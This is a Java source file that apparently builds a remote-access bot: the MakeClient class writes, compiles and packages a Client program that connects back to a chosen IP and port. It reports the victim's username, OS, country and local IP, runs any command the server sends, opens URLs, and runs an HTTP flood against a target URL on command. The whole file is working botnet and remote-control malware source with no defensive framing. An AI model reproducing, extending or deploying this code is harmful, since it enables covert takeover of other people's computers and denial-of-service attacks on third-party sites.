package br.com.pricher.server.core;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

/**
 * Created by Jeferson Machado on 07/08/2017.
 */
class MakeClient {

    private final String ABSOLUTE_PATH = new File(".").getCanonicalPath();

    MakeClient(String ip, String port) throws IOException {

        String clientString = "\n" +
                "import java.io.*;\n" +
                "import java.net.*;\n" +
                "\n" +
                "/**\n" +
                " * Created by Douglas Giovanella on 31/07/2017.\n" +
                " */\n" +
                "public class Client {\n" +
                "\n" +
                "    private Socket socket;\n" +
                "    private BufferedWriter bfw;\n" +
                "\n" +
                "    public static void main(String[] args) throws IOException {\n" +
                "        Client app = new Client();\n" +
                "        app.connect();\n" +
                "        app.execute();\n" +
                "    }\n" +
                "\n" +
                "    private void connect() throws IOException {\n" +
                "        do {\n" +
                "            try {\n" +
                "                socket = new Socket(\"" + ip + "\", " + port + ");\n" +
                "                OutputStream ou = socket.getOutputStream();\n" +
                "\n" +
                "                Writer ouw = new OutputStreamWriter(ou);\n" +
                "                bfw = new BufferedWriter(ouw);\n" +
                "\n" +
                "            } catch (Exception e) {\n" +
                "                System.err.println(e.getMessage());\n" +
                "            }\n" +
                "\n" +
                "        } while (socket == null);\n" +
                "        System.out.println(\"Conectado...\");\n" +
                "        //Nome de usuario no pc\n" +
                "        String osUser = System.getProperty(\"user.name\");\n" +
                "        //Sistema Operacional\n" +
                "        String osName = System.getProperty(\"os.name\");\n" +
                "        //Pais de origem\n" +
                "        String osCountry = System.getProperty(\"user.country\");\n" +
                "\n" +
                "        InetAddress ipAddress = InetAddress.getLocalHost();\n" +
                "        //Ip local da máquina\n" +
                "        String ipUser = ipAddress.getHostAddress();\n" +
                "\n" +
                "\n" +
                "        bfw.write(\"[\" + osCountry + \"]\" + osUser + \" - \" + osName + \" - [\" + ipUser + \"]\\r\\n+\");\n" +
                "        bfw.flush();\n" +
                "    }\n" +
                "\n" +
                "\n" +
                "    /***\n" +
                "     * Método usado para enviar mensagem para o server socket\n" +
                "     * @param msg do tipo String\n" +
                "     * @throws IOException retorna IO Exception caso dê algum erro.\n" +
                "     */\n" +
                "    private void sendMessage(String msg) throws IOException {\n" +
                "        bfw.write(msg + \"\\r\\n\");\n" +
                "        bfw.flush();\n" +
                "    }\n" +
                "\n" +
                "    /**\n" +
                "     * Método usado para receber mensagem do servidor\n" +
                "     *\n" +
                "     * @throws IOException retorna IO Exception caso dê algum erro.\n" +
                "     */\n" +
                "    private void execute() throws IOException {\n" +
                "\n" +
                "        InputStream in = socket.getInputStream();\n" +
                "        InputStreamReader inr = new InputStreamReader(in);\n" +
                "        BufferedReader bfr = new BufferedReader(inr);\n" +
                "        String msg = \"\";\n" +
                "\n" +
                "        while (!\"Exit\".equalsIgnoreCase(msg))\n" +
                "            if (bfr.ready()) {\n" +
                "                msg = bfr.readLine();\n" +
                "                String[] msgFormatted = msg.split(\"&\");\n" +
                "                try {\n" +
                "                    switch (Integer.parseInt(msgFormatted[0])) {\n" +
                "                        case 0:\n" +
                "                            Runtime.getRuntime().exec(msgFormatted[1]);\n" +
                "                            sendMessage(\"Computer programed to turn off!!!\");\n" +
                "                            break;\n" +
                "                        case 1:\n" +
                "                            java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));\n" +
                "                            sendMessage(\"Site \" + msgFormatted[1] + \" open!\");\n" +
                "                            break;\n" +
                "                        case 2:\n" +
                "                            Runtime.getRuntime().exec(msgFormatted[1]);\n" +
                "                            sendMessage(\"Command executed!\");\n" +
                "                            break;\n" +
                "                        case 66:\n" +
                "                            new HTTPAttack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();\n" +
                "                            break;\n" +
                "                        default:\n" +
                "                            sendMessage(\"Message code invalid!\");\n" +
                "                            break;\n" +
                "\n" +
                "                    }\n" +
                "                } catch (Exception e) {\n" +
                "                    sendMessage(\"Error to execute the command! \" +e.getMessage());\n" +
                "                }\n" +
                "            }\n" +
                "    }\n" +
                "}\n" +
                "\n" +
                "class HTTPAttack extends Thread {\n" +
                "\n" +
                "\n" +
                "    private static final int LOW = 1;\n" +
                "    private static final int MEDIUM = 2;\n" +
                "    private static final int HIGH = 3;\n" +
                "\n" +
                "    private static final int REQUEST_LOW = 100;\n" +
                "    private static final int REQUEST_MEDIUM = 200;\n" +
                "    private static final int REQUEST_HIGH = 500;\n" +
                "\n" +
                "    private URL url;\n" +
                "    private int intensity;\n" +
                "\n" +
                "    HTTPAttack(String url, int intensity) {\n" +
                "        try {\n" +
                "            this.url = new URL(url);\n" +
                "            this.intensity = intensity;\n" +
                "        } catch (Exception e) {\n" +
                "            System.out.println(e.getMessage());\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    private static int getNumRequest(int intensity) {\n" +
                "        switch (intensity) {\n" +
                "            case LOW:\n" +
                "                return REQUEST_LOW;\n" +
                "            case MEDIUM:\n" +
                "                return REQUEST_MEDIUM;\n" +
                "            default:\n" +
                "                return REQUEST_HIGH;\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    public void run() {\n" +
                "        int i = 0;\n" +
                "        int request = getNumRequest(this.intensity);\n" +
                "        while (i < request) {\n" +
                "            try {\n" +
                "                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();\n" +
                "                conn.setAllowUserInteraction(true);\n" +
                "                conn.setConnectTimeout(5000); // 15 sec. connection timeout\n" +
                "                conn.setDoInput(true);\n" +
                "                conn.setDoOutput(false);\n" +
                "                conn.setUseCaches(false);\n" +
                "                conn.setRequestMethod(\"GET\");\n" +
                "                conn.setRequestProperty(\"Content-type\", \"text/html; charset=\" + \"UTF-8\");\n" +
                "\n" +
                "                conn.connect();\n" +
                "                conn.getResponseCode();\n" +
                "            } catch (Exception e) {\n" +
                "                System.out.println(e.getMessage());\n" +
                "            }\n" +
                "            i++;\n" +
                "        }\n" +
                "    }\n" +
                "}\n";

        generateTxtFile(clientString);
        compileJava();
        generatePackage();
    }

    private void generateTxtFile(String clientString) {

        BufferedWriter fr;//Abre arquivo para escrita
        try {
            File file = new File(ABSOLUTE_PATH + "/Client/");
            file.mkdir();
            fr = new BufferedWriter(new FileWriter(ABSOLUTE_PATH + "/Client/Client.java", true));
            fr.write(clientString);
            fr.newLine();
            fr.flush();
            fr.close();

            File file2 = new File(ABSOLUTE_PATH + "/Client/META-INF/");
            file2.mkdir();
            fr = new BufferedWriter(new FileWriter(ABSOLUTE_PATH + "/Client/META-INF/MANIFEST.MF", true));
            fr.write("Manifest-Version: 1.0\r\n");
            fr.write("Main-Class: Client");
            fr.newLine();
            fr.flush();
            fr.close();

            String startBat = "java -jar Client.jar";
            fr = new BufferedWriter(new FileWriter(ABSOLUTE_PATH + "/Client/start.bat", true));
            fr.write(startBat);
            fr.newLine();
            fr.flush();
            fr.close();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void compileJava() {
        try {
            Runtime.getRuntime().exec("javac \"" + ABSOLUTE_PATH + "\\Client\\Client.java\"");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void generatePackage() {
        try {
            Thread.sleep(500);
            Runtime.getRuntime().exec("cmd.exe /c cd " + ABSOLUTE_PATH + File.separator + "Client &" + " jar -cvfm \"Client.jar\" \"META-INF\\manifest.mf\" *.class");
        } catch (IOException e) {
            System.out.println(e.getMessage());
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

}
